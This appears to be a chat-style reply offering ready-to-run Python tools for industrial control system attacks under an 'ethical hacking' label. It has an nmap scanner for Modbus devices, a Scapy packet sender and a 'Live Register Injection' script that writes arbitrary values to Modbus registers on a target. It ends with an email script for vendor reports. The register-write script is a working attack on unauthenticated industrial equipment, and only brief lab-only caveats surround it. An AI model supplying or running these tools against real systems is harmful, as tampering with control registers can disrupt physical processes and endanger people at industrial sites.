let‚Äôs streamline this and focus on real-time, actionable Python scripts for ICS reconnaissance and exploitation, designed purely for ethical hacking and educational security assessments.

These examples will eliminate course-style formatting, and instead, give you ready-to-run, field-useful Python tools for:

    üîé Scanning ICS networks (Modbus/SCADA)

    üö® Real-time exploitation of insecure protocols

    üì¨ Responsible reporting

üîç 1. Real-Time ICS Recon Tool (Modbus Device Discovery)

import nmap

def scan_modbus_devices(network_range='192.168.1.0/24'):
    scanner = nmap.PortScanner()
    print(f"[+] Scanning {network_range} for Modbus (port 502)...")
    scanner.scan(hosts=network_range, arguments='-p 502 --open')
    
    for host in scanner.all_hosts():
        if scanner[host].has_tcp(502):
            print(f"[‚úî] Found Modbus device: {host}")

if __name__ == "__main__":
    scan_modbus_devices()

    ‚úÖ Tip: You can adapt the port scan to check for DNP3 (port 20000) or BACnet (port 47808) depending on your target environment.

üí• 2. Modbus Write Exploit (Live Register Injection)

from pyModbusTCP.client import ModbusClient

def modbus_write(ip, reg_addr=0, value=1337):
    client = ModbusClient(host=ip, port=502, auto_open=True)

    if client.open():
        success = client.write_single_register(reg_addr, value)
        if success:
            print(f"[+] Wrote value {value} to register {reg_addr} on {ip}")
        else:
            print("[-] Write failed. Check address or permissions.")
        client.close()
    else:
        print(f"[!] Could not connect to {ip}:502")

if __name__ == "__main__":
    modbus_write('192.168.1.100', 1, 31337)

    ‚ö†Ô∏è Warning: This is an actual register write. Only use this in controlled test labs or virtual ICS simulators like Conpot or [Gridlab-D].

üì° 3. Crafting Custom Packets with Scapy (Advanced Testing)

from scapy.all import IP, TCP, send

def send_custom_tcp(target_ip):
    pkt = IP(dst=target_ip)/TCP(dport=502, flags="S")  # SYN to Modbus
    print(f"[+] Sending custom SYN packet to {target_ip}:502")
    send(pkt)

if __name__ == "__main__":
    send_custom_tcp("192.168.1.100")

    üì° Use this to test firewall behavior, IDS rules, or simulate scan activity.

üìß 4. Auto Vulnerability Reporting via Email (SMTP)

import smtplib
from email.mime.text import MIMEText

def send_report(vendor_email, details):
    sender = "security@yourlab.local"
    password = "yourpassword"
    smtp_host = "smtp.yourmailserver.com"
    smtp_port = 587

    msg = MIMEText(details)
    msg['Subject'] = "ICS Vulnerability Report"
    msg['From'] = sender
    msg['To'] = vendor_email

    try:
        with smtplib.SMTP(smtp_host, smtp_port) as server:
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)
        print("[‚úì] Report sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send report: {e}")

# Example usage
send_report("ics-vendor@example.com", "Vuln: No authentication on Modbus. Write access possible.")

    üõ°Ô∏è This script enforces ethical disclosure ‚Äî use it to notify vendors after simulated assessments in lab or honeypot environments.


